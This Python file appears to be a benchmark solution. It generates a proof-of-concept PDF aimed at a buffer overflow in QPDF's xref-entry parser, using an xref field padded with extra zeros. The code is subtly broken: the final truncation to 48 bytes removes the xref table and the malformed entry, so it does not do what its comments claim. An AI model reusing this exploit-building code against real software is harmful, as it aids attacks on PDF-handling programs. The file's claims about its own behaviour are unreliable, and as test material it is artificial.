import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in QPDF::read_xrefEntry
        # Need to create an xref table with overlong fields
        # According to description: overlong f1 or f2 entries consisting only of zeros
        # Ground-truth length: 48 bytes
        
        # Create a minimal PDF with malformed xref table
        # Format: xref entry is "f1 f2 n" where f1=10 digits, f2=5 digits
        # We'll make f1 very long (more than 10 digits) consisting of zeros
        # to trigger buffer overflow
        
        # Create PDF structure:
        # 1. PDF header
        # 2. Object with stream
        # 3. xref table with malformed entry
        # 4. trailer
        
        # Ground truth is 48 bytes, so we need to be efficient
        
        poc = b"%PDF-1.4\n"
        poc += b"1 0 obj\n"
        poc += b"<</Length 0>>\n"
        poc += b"stream\n"
        poc += b"endstream\n"
        poc += b"endobj\n"
        poc += b"xref\n"
        poc += b"0 2\n"
        poc += b"0000000000 65535 f \n"
        # Malformed entry: f1 field with 30 zeros instead of 10
        # This should trigger buffer overflow in read_xrefEntry
        poc += b"000000000000000000000000000000 00000 n \n"
        poc += b"trailer\n"
        poc += b"<</Size 2/Root 1 0 R>>\n"
        poc += b"startxref\n"
        poc += b"0\n"
        poc += b"%%EOF"
        
        return poc[:48]  # Ensure exact length